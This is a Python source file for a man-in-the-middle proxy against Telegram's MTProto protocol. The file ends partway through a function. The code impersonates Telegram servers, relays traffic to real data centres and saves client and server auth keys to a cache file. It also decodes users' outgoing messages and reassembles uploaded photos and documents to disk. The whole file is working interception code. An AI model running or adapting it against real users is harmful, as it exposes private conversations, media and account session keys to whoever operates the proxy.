#!/usr/bin/env python3
from __future__ import annotations
import argparse, asyncio, base64, gzip, hashlib, hmac, json, logging, math
import os, re, secrets, struct, sys, time
from dataclasses import dataclass
from pathlib import Path
from typing import Optional, Tuple
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, RSAPublicKey, RSAPublicNumbers
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.serialization import (
    Encoding, PublicFormat, PrivateFormat, NoEncryption, load_pem_private_key,
)
from cryptography.hazmat.backends import default_backend

log = logging.getLogger("mitm")

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 443

REAL_DC_IPS = {
    1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100",
    4: "149.154.167.91", 5: "149.154.171.5",
}

DH_PRIME = int.from_bytes(bytes.fromhex(
    "C71CAEB9C6B1C9048E6C522F70F13F73980D40238E3E21C14934D037563D930F"
    "48198A0AA7C14058229493D22530F4DBFA336F6E0AC925139543AED44CCE7C37"
    "20FD51F69458705AC68CD4FE6B6B13ABDC9746512969328454F18FAF8C595F64"
    "2477FE96BB2A941D5BCD1D4AC8CC49880708FA9B378E3C4F3A9060BEE67CF9A4"
    "A4A695811051907E162753B56B0F6B410DBA74D8A84B2A14B3144E0EF1284754"
    "FD17ED950D5965B4B9DD46582DB1178D169C6BC465B0D6FF9CA3928FEF5B9AE4"
    "E418FC15E83EBEA0F87FA9FF5EED70050DED2849F47BF959D956850CE929851F"
    "0D8115F635B105EE2E4E15D04B2454BF6F4FADF034B10403119CD8E3B92FCC5B"
), 'big')
DH_G = 3

# TL constructors
C_REQ_PQ_MULTI     = 0xBE7E8EF1
C_REQ_PQ           = 0x60469778
C_RES_PQ           = 0x05162463
C_REQ_DH_PARAMS    = 0xD712E4BE
C_DH_PARAMS_OK     = 0xD0E8075C
C_DH_PARAMS_FAIL   = 0x79CB045D
C_SERVER_DH_INNER  = 0xB5890DBA
C_CLIENT_DH_INNER  = 0x6643B654
C_SET_CLIENT_DH    = 0xF5045F1F
C_DH_GEN_OK        = 0x3BCBF734
C_DH_GEN_RETRY     = 0x46DC1FB9
C_DH_GEN_FAIL      = 0xA69DAE02
C_PQ_INNER_DC      = 0xA9F55F95
C_PQ_INNER_TEMP_DC = 0x56FDDF88
C_MSG_CONTAINER    = 0x73F1F8DC
C_BIND_TEMP_KEY    = 0xCDD42A05
C_RPC_RESULT       = 0xF35C6D01
C_BOOL_TRUE        = 0x997275B5
C_VECTOR           = 0x1CB5C415

REAL_TG_RSA_PEM = b"""\
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA6LszBcC1LGzyr992NzE0ieY+BSaOW622Aa9Bd4ZHLl+TuFQ4lo4g
5nKaMBwK/BIb9xUfg0Q29/2mgIR6Zr9krM7HjuIcCzFvDtr+L0GQjae9H0pRB2OO
62cECs5HKhT5DZ98K33vmWiLowc621dQuwKWSQKjWf50XYFw42h21P2KXUGyp2y/
+aEyZ+uVgLLQbRA1dEjSDZ2iGRy12Mk5gpYc397aYp438fsJoHIgJ2lgMv5h7WY9
t6N/byY9Nw9p21Og3AoXSL2q/2IJ1WRUhebgAdGVMlV1fkuOQoEzR7EdpqtQD9Cs
5+bfo3Nhmcyvk5ftB0WkJ9z6bNZ7yxrP8wIDAQAB
-----END RSA PUBLIC KEY-----"""

KEY_DIR = Path(__file__).parent / "mitm_keys"
CACHE_FILE = KEY_DIR / "auth_cache.json"
MEDIA_DIR = Path(__file__).parent / "mitm_media"

_upload_parts: dict[int, dict[int, bytes]] = {}

# AES-IGE

def aes_ige_encrypt(pt: bytes, key: bytes, iv: bytes) -> bytes:
    aes = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
    iv_c, iv_p = iv[:16], iv[16:]
    out = bytearray()
    for i in range(0, len(pt), 16):
        b = pt[i:i+16]
        enc = aes.update(bytes(a ^ b for a, b in zip(b, iv_c)))
        blk = bytes(a ^ b for a, b in zip(enc, iv_p))
        out.extend(blk)
        iv_p, iv_c = b, blk
    return bytes(out)


def aes_ige_decrypt(ct: bytes, key: bytes, iv: bytes) -> bytes:
    aes = Cipher(algorithms.AES(key), modes.ECB()).decryptor()
    iv_c, iv_p = iv[:16], iv[16:]
    out = bytearray()
    for i in range(0, len(ct), 16):
        b = ct[i:i+16]
        dec = aes.update(bytes(a ^ b for a, b in zip(b, iv_p)))
        blk = bytes(a ^ b for a, b in zip(dec, iv_c))
        out.extend(blk)
        iv_c, iv_p = b, blk
    return bytes(out)

# TL helpers

def tl_bytes(data: bytes) -> bytes:
    n = len(data)
    if n < 254:
        hdr = bytes([n]); pad = (4 - (n + 1) % 4) % 4
    else:
        hdr = b'\xfe' + struct.pack('<I', n)[:3]; pad = (4 - n % 4) % 4
    return hdr + data + b'\x00' * pad


def tl_read(data: bytes, off: int) -> Tuple[bytes, int]:
    f = data[off]
    if f < 254:
        ln = f; s = off + 1; th = 1
    else:
        ln = int.from_bytes(data[off+1:off+4], 'little'); s = off + 4; th = 4
    v = data[s:s+ln]; t = th + ln; t += (-t) & 3
    return v, off + t


def tl_read_str(buf: bytes, off: int) -> Tuple[str | None, int]:
    if off >= len(buf): return None, off
    f = buf[off]
    print(f"tl_read_str: off={off}, first_byte=0x{f:02X}")
    if f < 254:
        sl = f; d = buf[off+1:off+1+sl]; t = 1 + sl
    elif f == 254:
        if off + 4 > len(buf): return None, off
        sl = int.from_bytes(buf[off+1:off+4], 'little'); d = buf[off+4:off+4+sl]; t = 4 + sl
    else:
        return None, off + 1
    return d.decode('utf-8', errors='replace'), off + t + ((-t) & 3)


def tl_read_i32(buf: bytes, off: int) -> Tuple[int | None, int]:
    if off + 4 > len(buf): return None, off
    return struct.unpack_from('<I', buf, off)[0], off + 4


def tl_read_i64(buf: bytes, off: int) -> Tuple[int | None, int]:
    if off + 8 > len(buf): return None, off
    return struct.unpack_from('<q', buf, off)[0], off + 8

# RSA

def compute_fingerprint(pub: RSAPublicKey) -> int:
    pn = pub.public_numbers()
    nb = pn.n.to_bytes((pn.n.bit_length()+7)//8, 'big')
    eb = pn.e.to_bytes((pn.e.bit_length()+7)//8, 'big')
    return struct.unpack('<Q', hashlib.sha1(tl_bytes(nb) + tl_bytes(eb)).digest()[12:20])[0]


def rsa_encrypt(data: bytes, pub: RSAPublicKey) -> bytes:
    n, e = pub.public_numbers().n, pub.public_numbers().e
    return pow(int.from_bytes(data, 'big'), e, n).to_bytes(256, 'big')


def rsa_decrypt(data: bytes, priv: RSAPrivateKey) -> bytes:
    n = priv.private_numbers().public_numbers.n
    d = priv.private_numbers().d
    return pow(int.from_bytes(data, 'big'), d, n).to_bytes(256, 'big')


def encrypt_pq_inner_rsa(inner: bytes, pub: RSAPublicKey) -> bytes:
    n = pub.public_numbers().n
    while True:
        dp = inner + os.urandom(192 - len(inner))
        tk = os.urandom(32)
        dh = dp[::-1] + hashlib.sha256(tk + dp).digest()
        ae = aes_ige_encrypt(dh, tk, b'\x00' * 32)
        kae = bytes(a ^ b for a, b in zip(tk, hashlib.sha256(ae).digest())) + ae
        if int.from_bytes(kae, 'big') < n:
            return rsa_encrypt(kae, pub)


def decrypt_pq_inner_rsa(enc: bytes, priv: RSAPrivateKey) -> Optional[bytes]:
    kae = rsa_decrypt(enc, priv)
    tk = bytes(a ^ b for a, b in zip(kae[:32], hashlib.sha256(kae[32:]).digest()))
    dwh = aes_ige_decrypt(kae[32:], tk, b'\x00' * 32)
    dp = dwh[:192][::-1]
    if not hmac.compare_digest(hashlib.sha256(tk + dp).digest(), dwh[192:224]):
        return None
    return dp


def load_pkcs1_pub(der: bytes) -> RSAPublicKey:
    def rd_int(d, o):
        assert d[o] == 0x02; o += 1
        f = d[o]; o += 1
        if f < 0x80: ln = f
        else: nb = f & 0x7F; ln = int.from_bytes(d[o:o+nb], 'big'); o += nb
        return int.from_bytes(d[o:o+ln], 'big'), o + ln
    o = 1
    f = der[o]; o += 1
    if f >= 0x80: o += f & 0x7F
    n, o = rd_int(der, o); e, _ = rd_int(der, o)
    return RSAPublicNumbers(e, n).public_key(default_backend())

# PQ factorisation

def factorize_pq(pq: int) -> Tuple[int, int]:
    if pq % 2 == 0: return 2, pq // 2
    for c in range(1, 100):
        x = y = secrets.randbelow(pq - 2) + 2; d = 1
        while d == 1:
            x = (x*x+c) % pq; y = (y*y+c) % pq; y = (y*y+c) % pq
            d = math.gcd(abs(x-y), pq)
        if d != pq:
            return (min(d, pq//d), max(d, pq//d))
    raise RuntimeError(f"Failed to factor {pq}")


def _random_prime(bits: int) -> int:
    while True:
        n = secrets.randbits(bits) | (1 << (bits-1)) | 1
        if _is_prime(n): return n


def _is_prime(n: int) -> bool:
    if n < 4: return n >= 2
    if n % 2 == 0: return False
    r, d = 0, n - 1
    while d % 2 == 0: r += 1; d //= 2
    for _ in range(20):
        x = pow(secrets.randbelow(n-3)+2, d, n)
        if x in (1, n-1): continue
        for _ in range(r-1):
            x = pow(x, 2, n)
            if x == n-1: break
        else: return False
    return True

# Obfuscated2 transport

class Obfuscated2:
    def __init__(self, init: bytes, is_client: bool):
        key, iv = init[8:40], init[40:56]
        ri = bytearray(48)
        for i in range(48): ri[i] = init[55 - i]
        rk, riv = bytes(ri[:32]), bytes(ri[32:48])
        if is_client:
            self._dec = Cipher(algorithms.AES(key), modes.CTR(iv)).encryptor()
            self._enc = Cipher(algorithms.AES(rk), modes.CTR(riv)).encryptor()
            self._dec.update(b'\x00' * 64)
        else:
            self._enc = Cipher(algorithms.AES(key), modes.CTR(iv)).encryptor()
            self._dec = Cipher(algorithms.AES(rk), modes.CTR(riv)).encryptor()
            self._enc.update(b'\x00' * 64)

    def decrypt(self, data: bytes) -> bytes: return self._dec.update(data)
    def encrypt(self, data: bytes) -> bytes: return self._enc.update(data)


def gen_obfs2_init(dc_id: int) -> bytes:
    while True:
        init = bytearray(os.urandom(64))
        f4 = struct.unpack_from('<I', init, 0)[0]
        if init[0] in (0xef, 0x00) or f4 in (0x44414548,0x54534F50,0x20544547,0x4954504F,0xDDDDDDDD,0xEEEEEEEE,0x02010316):
            continue
        break
    tail = struct.pack('<Ih', 0xEEEEEEEE, dc_id) + os.urandom(2)
    ks = Cipher(algorithms.AES(bytes(init[8:40])), modes.CTR(bytes(init[40:56]))).encryptor().update(b'\x00'*64)
    for i in range(8): init[56+i] = tail[i] ^ ks[56+i]
    return bytes(init)

# Framing

class IntermediateFraming:
    @staticmethod
    async def read(r: asyncio.StreamReader, o: Obfuscated2) -> bytes:
        ln = struct.unpack('<I', o.decrypt(await r.readexactly(4)))[0]
        if ln > 16*1024*1024: raise ValueError(f"Frame too large: {ln}")
        return o.decrypt(await r.readexactly(ln))

    @staticmethod
    def write(w: asyncio.StreamWriter, p: bytes, o: Obfuscated2):
        w.write(o.encrypt(struct.pack('<I', len(p)) + p))


class AbridgedFraming:
    @staticmethod
    async def read(r: asyncio.StreamReader, o: Obfuscated2) -> bytes:
        fb = o.decrypt(await r.readexactly(1))[0]
        if fb >= 0x7f:
            ln = int.from_bytes(o.decrypt(await r.readexactly(3)), 'little') * 4
        else:
            ln = fb * 4
        if ln == 0 or ln > 16*1024*1024: raise ValueError(f"Bad frame: {ln}")
        return o.decrypt(await r.readexactly(ln))

    @staticmethod
    def write(w: asyncio.StreamWriter, p: bytes, o: Obfuscated2):
        if len(p) % 4: p += b'\x00' * (4 - len(p) % 4)
        lw = len(p) // 4
        hdr = bytes([lw]) if lw < 0x7f else b'\x7f' + lw.to_bytes(3, 'little')
        w.write(o.encrypt(hdr + p))


def get_framing(t: str):
    return AbridgedFraming if t == "abridged" else IntermediateFraming

# MTProto encryption

def _derive_keys(auth_key: bytes, msg_key: bytes, x: int) -> Tuple[bytes, bytes]:
    a = hashlib.sha256(msg_key + auth_key[x:x+36]).digest()
    b = hashlib.sha256(auth_key[40+x:76+x] + msg_key).digest()
    return a[:8]+b[8:24]+a[24:32], b[:8]+a[8:24]+b[24:32]


def decrypt_msg(data: bytes, auth_key: bytes, from_client: bool) -> Optional[bytes]:
    if len(data) < 24: return None
    mk, enc = data[8:24], data[24:]
    if len(enc) % 16: return None
    x = 0 if from_client else 8
    k, iv = _derive_keys(auth_key, mk, x)
    pt = aes_ige_decrypt(enc, k, iv)
    exp = hashlib.sha256(auth_key[88+x:120+x] + pt).digest()[8:24]
    return pt if hmac.compare_digest(mk, exp) else None


def encrypt_msg(pt: bytes, auth_key: bytes, from_client: bool) -> bytes:
    x = 0 if from_client else 8
    mk = hashlib.sha256(auth_key[88+x:120+x] + pt).digest()[8:24]
    k, iv = _derive_keys(auth_key, mk, x)
    kid = hashlib.sha1(auth_key).digest()[12:20]
    return kid + mk + aes_ige_encrypt(pt, k, iv)

# Auth state & cache

@dataclass
class AuthState:
    nonce: bytes = b''; server_nonce: bytes = b''; new_nonce: bytes = b''
    pq: int = 0; p: int = 0; q: int = 0
    our_a: int = 0; g_a: int = 0; g_b: int = 0
    auth_key: bytes = b''; auth_key_id: bytes = b''; server_salt: bytes = b''
    dc_id: int = 2; queued_client_msg: Optional[bytes] = None

_auth_key_cache: dict[bytes, bytes] = {}
_server_auth_cache: dict[int, AuthState] = {}


def _save_cache():
    try:
        KEY_DIR.mkdir(exist_ok=True)
        CACHE_FILE.write_text(json.dumps({
            "client_keys": {k.hex(): v.hex() for k, v in _auth_key_cache.items()},
            "server_keys": {
                str(dc): {"auth_key_id": s.auth_key_id.hex(), "auth_key": s.auth_key.hex(), "server_salt": s.server_salt.hex()}
                for dc, s in _server_auth_cache.items() if s.auth_key
            },
        }, indent=2))
    except Exception as e:
        log.warning(f"Cache save failed: {e}")


def _load_cache():
    if not CACHE_FILE.exists(): return
    try:
        d = json.loads(CACHE_FILE.read_text())
        for kh, vh in d.get("client_keys", {}).items():
            _auth_key_cache[bytes.fromhex(kh)] = bytes.fromhex(vh)
        for dc_s, e in d.get("server_keys", {}).items():
            st = AuthState(dc_id=int(dc_s))
            st.auth_key_id = bytes.fromhex(e["auth_key_id"])
            st.auth_key = bytes.fromhex(e["auth_key"])
            st.server_salt = bytes.fromhex(e["server_salt"])
            _server_auth_cache[int(dc_s)] = st
        log.info(f"Cache: {len(_auth_key_cache)} client + {len(_server_auth_cache)} server key(s)")
    except Exception as e:
        log.warning(f"Cache load failed: {e}")

# Unencrypted message helpers

_msg_id_counter = 0

def _gen_msg_id(server: bool = True) -> int:
    global _msg_id_counter
    mid = int(time.time() * (1 << 32))
    if server: mid = (mid | 1) & ~2
    else: mid = (mid >> 2) << 2
    if mid <= _msg_id_counter: mid = _msg_id_counter + 4; mid |= 1 if server else 0
    _msg_id_counter = mid
    return mid


def _send_unenc(w, obfs, body, Framing=IntermediateFraming, server=True):
    mid = _gen_msg_id(server=server)
    msg = b'\x00'*8 + struct.pack('<qI', mid, len(body)) + body
    Framing.write(w, msg, obfs)


def _derive_tmp_aes(nn: bytes, sn: bytes):
    a = hashlib.sha1(nn + sn).digest(); b = hashlib.sha1(sn + nn).digest(); c = hashlib.sha1(nn + nn).digest()
    return a[:20] + b[:12], b[12:20] + c[:20] + nn[:4]

# TL name table & message logging 

_MTPROTO_INTERNAL = {
    0x73F1F8DC: "msg_container", 0x62D6B459: "msgs_ack", 0xF35C6D01: "rpc_result",
    0x2144CA19: "rpc_error", 0x3072CFA1: "gzip_packed", 0x7ABE77EC: "ping",
    0x347773C5: "pong", 0xF3427B8C: "ping_delay_disconnect",
    0x9EC20908: "new_session_created", 0xEDAB447B: "bad_server_salt",
    0xA7EFF811: "bad_msg_notification", 0xAE500895: "future_salts",
    0x75A3F765: "bind_auth_key_inner", 0xCDD42A05: "auth.bindTempAuthKey",
    0x5BB8E511: "msg_new_detailed_info", 0x809DB6DF: "msg_detailed_info",
    0xE7512126: "msg_resend_req", 0xDA69FB52: "msgs_state_req",
    0x04DEB57D: "msgs_state_info", 0x0949D9DC: "msgs_all_info",
    0xE22045FC: "destroy_session_ok", 0x62D350C9: "destroy_session_none",
}


def _load_tl_schema() -> dict[int, str]:
    TL_LINE_RE = re.compile(r'^(\S+?)#([0-9a-fA-F]+)\s')
    TL_PATH = Path(__file__).parent / "api.tl"

    names = dict(_MTPROTO_INTERNAL)
    values = {v: k for k, v in names.items()}

    if not TL_PATH.exists():
        log.error(f"api.tl not found at {TL_PATH}")
        raise RuntimeError("api.tl is required for TL schema parsing")
    
    try:
        for line in TL_PATH.read_text(encoding='utf-8').splitlines():
            m = TL_LINE_RE.match(line)
            if m:
                names[int(m.group(2), 16)] = m.group(1)
                values[m.group(1)] = int(m.group(2), 16)
        log.info(f"TL schema: {len(names)} constructors from {TL_PATH.name}")
    except Exception as e:
        log.warning(f"Failed to parse api.tl: {e}")

    return names, values


TL_NAMES, TL_VALUES = _load_tl_schema()


def _decode_peer(buf, off):
    if off+4 > len(buf): return "?", off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4

    match TL_NAMES.get(c, None):
        case "inputPeerSelf": return "self", off
        case "inputPeerEmpty": return "empty", off
        case "inputPeerChat": v, off = tl_read_i64(buf, off); return f"chat({v})", off
        case "inputPeerChannel": v, off = tl_read_i64(buf, off); _, off = tl_read_i64(buf, off); return f"channel({v})", off
        case "inputPeerUser": v, off = tl_read_i64(buf, off); _, off = tl_read_i64(buf, off); return f"user({v})", off
        case "inputPeerUserFromMessage": _, off = _decode_peer(buf, off); _, off = tl_read_i32(buf, off); v, off = tl_read_i64(buf, off); return f"peer_user({v})", off
        case "inputPeerChannelFromMessage": _, off = _decode_peer(buf, off); _, off = tl_read_i32(buf, off); v, off = tl_read_i64(buf, off); return f"peer_channel({v})", off
        case "peerUser": v, off = tl_read_i64(buf, off); return f"user({v})", off
        case "peerChat": v, off = tl_read_i64(buf, off); return f"chat({v})", off
        case "peerChannel": v, off = tl_read_i64(buf, off); return f"channel({v})", off
        case _: return f"0x{c:08X}", off


def _read_input_file(buf: bytes, off: int) -> tuple[int | None, str | None, int]:
    if off + 4 > len(buf): return None, None, off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    nm = TL_NAMES.get(c, '')
    if nm in ('inputFile', 'inputFileBig'):
        file_id, off = tl_read_i64(buf, off)
        _, off = tl_read_i32(buf, off)  # parts
        name, off = tl_read_str(buf, off)  # name
        if nm == 'inputFile': _, off = tl_read_str(buf, off)  # md5_checksum
        return file_id, name, off
    return None, None, off

def _read_input_photo(buf: bytes, off: int) -> tuple[int | None, int]:
    if off + 4 > len(buf): return None, off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    if TL_NAMES.get(c) == 'inputPhoto':
        photo_id, off = tl_read_i64(buf, off)
        off += 8  # access_hash
        _, off = tl_read(buf, off)  # file_reference
        return photo_id, off
    return None, off

def _intercept_upload(body: bytes):
    if len(body) < 4: return
    c = struct.unpack_from('<I', body, 0)[0]
    nm = TL_NAMES.get(c, '')
    if nm == 'upload.saveFilePart':
        off = 4
        file_id, off = tl_read_i64(body, off)
        part_no, off = tl_read_i32(body, off)
        data, off = tl_read(body, off)
        if file_id not in _upload_parts: _upload_parts[file_id] = {}
        _upload_parts[file_id][part_no] = data
        log.debug(f"Buffered upload part {part_no} for file {file_id} ({len(data)}B)")
    elif nm == 'upload.saveBigFilePart':
        off = 4
        file_id, off = tl_read_i64(body, off)
        part_no, off = tl_read_i32(body, off)
        total, off = tl_read_i32(body, off)
        data, off = tl_read(body, off)
        if file_id not in _upload_parts: _upload_parts[file_id] = {}
        _upload_parts[file_id][part_no] = data
        log.debug(f"Buffered big upload part {part_no}/{total} for file {file_id} ({len(data)}B)")

def _save_upload(file_id: int, name: str | None) -> Path | None:
    parts = _upload_parts.pop(file_id, None)
    if not parts: return None
    MEDIA_DIR.mkdir(exist_ok=True)
    data = b''.join(parts[i] for i in sorted(parts))
    ext = Path(name).suffix if name else ''
    if not ext:
        if data[:3] == b'\xff\xd8\xff': ext = '.jpg'
        elif data[:8] == b'\x89PNG\r\n\x1a\n': ext = '.png'
        elif data[:4] == b'RIFF' and len(data) > 11 and data[8:12] == b'WEBP': ext = '.webp'
        elif data[:3] == b'GIF': ext = '.gif'
        elif data[:4] == b'\x1a\x45\xdf\xa3': ext = '.webm'
        elif data[4:8] == b'ftyp': ext = '.mp4'
        else: ext = '.bin'
    fname = f"{time.strftime('%Y%m%d_%H%M%S')}_{file_id}{ext}"
    path = MEDIA_DIR / fname
    path.write_bytes(data)
    log.info(f"Saved upload: {path} ({len(data)}B)")
    return path

def _skip_input_document(buf: bytes, off: int) -> int:
    if off + 4 > len(buf): return off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    if TL_NAMES.get(c) == 'inputDocument':
        off += 16  # id:long + access_hash:long
        _, off = tl_read(buf, off)  # file_reference:bytes
    return off

def _skip_input_geo(buf: bytes, off: int) -> int:
    if off + 4 > len(buf): return off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    if TL_NAMES.get(c) == 'inputGeoPoint':
        flags, off = tl_read_i32(buf, off)
        off += 16  # lat:double + long:double
        if flags & 1: off += 4  # accuracy_radius
    return off

def _skip_input_sticker_set(buf: bytes, off: int) -> int:
    if off + 4 > len(buf): return off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    nm = TL_NAMES.get(c, '')
    if nm == 'inputStickerSetID': off += 16  # id + access_hash
    elif nm == 'inputStickerSetShortName': _, off = tl_read_str(buf, off)
    return off

def _skip_doc_attribute(buf: bytes, off: int) -> int:
    if off + 4 > len(buf): return off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    nm = TL_NAMES.get(c, '')
    if nm == 'documentAttributeImageSize':
        off += 8  # w:int + h:int
    elif nm == 'documentAttributeSticker':
        flags, off = tl_read_i32(buf, off)
        _, off = tl_read_str(buf, off)  # alt
        off = _skip_input_sticker_set(buf, off)
        if flags & 1: off += 28  # MaskCoords: n(4)+x(8)+y(8)+zoom(8)
    elif nm == 'documentAttributeVideo':
        flags, off = tl_read_i32(buf, off)
        off += 16  # duration:double + w:int + h:int
        if flags & 4:  off += 4   # preload_prefix_size
        if flags & 16: off += 8   # video_start_ts:double
        if flags & 32: _, off = tl_read_str(buf, off)  # video_codec
    elif nm == 'documentAttributeAudio':
        flags, off = tl_read_i32(buf, off)
        off += 4  # duration:int
        if flags & 1: _, off = tl_read_str(buf, off)  # title
        if flags & 2: _, off = tl_read_str(buf, off)  # performer
        if flags & 4: _, off = tl_read(buf, off)       # waveform:bytes
    elif nm == 'documentAttributeFilename':
        _, off = tl_read_str(buf, off)
    elif nm == 'documentAttributeCustomEmoji':
        flags, off = tl_read_i32(buf, off)
        _, off = tl_read_str(buf, off)  # alt
        off = _skip_input_sticker_set(buf, off)
    return off

def _skip_doc_attr_vector(buf: bytes, off: int) -> int:
    off += 4  # vector ctor
    cnt, off = tl_read_i32(buf, off)
    for _ in range(cnt or 0): off = _skip_doc_attribute(buf, off)
    return off

def _skip_input_document_vector(buf: bytes, off: int) -> int:
    off += 4  # vector ctor
    cnt, off = tl_read_i32(buf, off)
    for _ in range(cnt or 0): off = _skip_input_document(buf, off)
    return off

def _decode_media(buf: bytes, off: int) -> tuple[str, int]:
    if off + 4 > len(buf): return '?', off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    nm = TL_NAMES.get(c, f'0x{c:08X}')
    match nm:
        case 'inputMediaEmpty':
            return 'empty', off
        case 'inputMediaPhoto':
            flags, off = tl_read_i32(buf, off)
            photo_id, off = _read_input_photo(buf, off)
            if flags & 1: off += 4  # ttl_seconds
            return f'photo(id={photo_id})' if photo_id else 'photo', off
        case 'inputMediaUploadedPhoto':
            flags, off = tl_read_i32(buf, off)
            file_id, file_name, off = _read_input_file(buf, off)
            if flags & 1: off = _skip_input_document_vector(buf, off)  # stickers
            if flags & 2: off += 4  # ttl_seconds
            saved = _save_upload(file_id, file_name) if file_id else None
            label = f'photo → {saved.name}' if saved else 'photo(upload)'
            return label, off
        case 'inputMediaGeoPoint':
            off = _skip_input_geo(buf, off)
            return 'geo', off
        case 'inputMediaGeoLive':
            flags, off = tl_read_i32(buf, off)
            off = _skip_input_geo(buf, off)
            if flags & 4: off += 4  # heading
            if flags & 2: off += 4  # period
            if flags & 8: off += 4  # proximity_notification_radius
            return 'geo_live', off
        case 'inputMediaContact':
            phone, off = tl_read_str(buf, off)
            _, off = tl_read_str(buf, off)  # first_name
            _, off = tl_read_str(buf, off)  # last_name
            _, off = tl_read_str(buf, off)  # vcard
            return f'contact({phone})', off
        case 'inputMediaDocument':
            flags, off = tl_read_i32(buf, off)
            off = _skip_input_document(buf, off)
            if flags & 8:  off = _read_input_photo(buf, off)[1]  # video_cover
            if flags & 16: off += 4  # video_timestamp
            if flags & 1:  off += 4  # ttl_seconds
            if flags & 2:  _, off = tl_read_str(buf, off)  # query
            return 'document', off
        case 'inputMediaUploadedDocument':
            flags, off = tl_read_i32(buf, off)
            file_id, file_name, off = _read_input_file(buf, off)  # file
            if flags & 4: _, _, off = _read_input_file(buf, off)  # thumb
            mime, off = tl_read_str(buf, off)  # mime_type
            off = _skip_doc_attr_vector(buf, off)  # attributes
            if flags & 1:   off = _skip_input_document_vector(buf, off)  # stickers
            if flags & 64:  off = _read_input_photo(buf, off)[1]  # video_cover
            if flags & 128: off += 4  # video_timestamp
            if flags & 2:   off += 4  # ttl_seconds
            saved = _save_upload(file_id, file_name) if file_id else None
            kind = 'video' if mime and mime.startswith('video/') else 'document'
            label = f'{kind} → {saved.name}' if saved else f'{kind}(upload)'
            return label, off
        case 'inputMediaDice':
            emoticon, off = tl_read_str(buf, off)
            return f'dice({emoticon})', off
        case 'inputMediaStory':
            _, off = _decode_peer(buf, off)
            _, off = tl_read_i32(buf, off)  # id
            return 'story', off
        case 'inputMediaWebPage':
            _, off = tl_read_i32(buf, off)  # flags
            url, off = tl_read_str(buf, off)
            return f'webpage({url})', off
        case 'inputMediaPaidMedia':
            flags, off = tl_read_i32(buf, off)
            off += 8  # stars_amount:long
            off += 4  # vector ctor
            cnt, off = tl_read_i32(buf, off)
            for _ in range(cnt or 0): _, off = _decode_media(buf, off)
            if flags & 1: _, off = tl_read_str(buf, off)  # payload
            return 'paid_media', off
        case _:
            label = nm.split('.')[-1] if nm else f'0x{c:08X}'
            return label, off


def _skip_msg_entity(buf: bytes, off: int) -> int:
    if off + 4 > len(buf): return off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    nm = TL_NAMES.get(c, '')
    off += 8  # offset:int + length:int always present
    if nm in ('messageEntityTextUrl', 'messageEntityPre'):
        _, off = tl_read_str(buf, off)
    elif nm == 'messageEntityMentionName':
        off += 8  # user_id:long
    elif nm == 'inputMessageEntityMentionName':
        off += 12  # InputUser ctor(4) + user_id(8)
    elif nm == 'messageEntityCustomEmoji':
        off += 8  # document_id:long
    return off


def _parse_reply_to(buf: bytes, off: int) -> int:
    if off + 4 > len(buf): return off
    c = struct.unpack_from('<I', buf, off)[0]; off += 4
    payload = ""

    nm = TL_NAMES.get(c, '')
    if nm == 'inputReplyToMessage':
        flags, off = tl_read_i32(buf, off)
        reply_to_msg_id, off = tl_read_i32(buf, off)
        if flags & 1: _, off = tl_read_i32(buf, off)  # top_msg_id
        if flags & 2: reply_to_peer_id, off = _decode_peer(buf, off); payload += f" reply_to={reply_to_peer_id}"
        if flags & 4: quote_text, off = tl_read_str(buf, off); payload += f" quote_text={quote_text}"
        
        if flags & 8:  # quote_entities Vector<MessageEntity>
            off += 4  # vector ctor
            cnt, off = tl_read_i32(buf, off)
            for _ in range(cnt or 0):
                off = _skip_msg_entity(buf, off)
        if flags & 16: _, off = tl_read_i32(buf, off)   # quote_offset
    elif nm == 'inputReplyToStory':
        _, off = _decode_peer(buf, off)  # peer
        _, off = tl_read_i32(buf, off)   # story_id
    return payload, off


def _decode_send(body: bytes, edited: bool = False) -> str | None:
    try:
        off = 4
        flags, off = tl_read_i32(body, off)
        if flags is None: return None
        peer, off = _decode_peer(body, off)
        if flags & 1: payload, off = _parse_reply_to(body, off); payload = f"[reply, {payload}]" if payload else "[reply]"
        else: payload = ""
        msg, _ = tl_read_str(body, off if not edited else off+4)
        return f"→{peer}: {msg!r} {payload}" if msg else f"→{peer}"
    except Exception:
        return None
    

def _decode_send_media(body: bytes) -> str | None:
    try:
        off = 4
        flags, off = tl_read_i32(body, off)
        if flags is None: return None
        peer, off = _decode_peer(body, off)
        if flags & 1: reply_info, off = _parse_reply_to(body, off); reply_info = f" [{reply_info.strip() or 'reply'}]" if reply_info else " [reply]"
        else: reply_info = ""
        media, off = _decode_media(body, off)
        msg, _ = tl_read_str(body, off)
        caption = f": {msg!r}" if msg else ""
        return f"→{peer} [{media}]{caption}{reply_info}"
    except Exception:
        return None


def _decode_incoming_msg(body: bytes) -> str | None:
    """Decode message# from incoming updates."""
    try:
        off = 4  # skip ctor
        flags, off = tl_read_i32(body, off)
        if flags is None: return None
        flags2 = 0
        is_out = bool(flags & 2)
        msg_id, off = tl_read_i32(body, off)  # id:int
        from_id = None
        if flags & 0x100:  # flags.8 → from_id:Peer
            from_id, off = _decode_peer(body, off)
        if flags & 0x20000000:  # flags.29 → from_boosts_applied
            off += 4
        peer_id, off = _decode_peer(body, off)  # peer_id:Peer
        if flags & 0x10000000:  # flags.28 → saved_peer_id
            _, off = _decode_peer(body, off)
        if flags & 4:  # flags.2 → fwd_from:MessageFwdHeader
            fwd_off_start = off
            fwd_c = struct.unpack_from('<I', body, off)[0]; off += 4
            if TL_NAMES.get(fwd_c) == 'messageFwdHeader':
                ff, off = tl_read_i32(body, off)
                if ff & 1: _, off = _decode_peer(body, off)  # from_id
                if ff & 2: _, off = tl_read_str(body, off)   # from_name
                off += 4  # date
                if ff & 4: off += 4  # channel_post
